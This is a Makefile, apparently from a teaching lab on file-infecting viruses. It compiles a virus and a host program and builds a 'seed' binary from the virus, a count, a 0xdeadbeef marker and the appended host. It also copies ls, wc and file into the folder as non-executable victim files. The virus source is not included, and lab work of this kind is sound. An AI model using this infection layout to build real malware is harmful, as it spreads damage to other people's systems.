all: setup

host:
	gcc -Wall -Wextra host.c -o host

virus:
	gcc -Wall -Wextra virus.c -o virus

seed: virus host
	cp virus seed
	printf '\x01\x00\x00\x00' >> seed
	printf '\xde\xad\xbe\xef' >> seed
	cat host >> seed
	chmod u+x seed

setup: seed
	cp /bin/ls ./victim1
	cp /usr/bin/wc ./victim2
	cp /usr/bin/file ./victim3
	chmod ugo-x ./victim1 ./victim2 ./victim3
	cp /bin/ls ./host1
	cp /bin/ls ./host2
	cp /bin/ls ./host3
	cp /bin/ls ./host4
	chmod ugo-x ./host1 ./host2 ./host3 ./host4

clean:
	rm -f host virus seed victim1 victim2 victim3 host1 host2 host3 host4
	rm -rf tem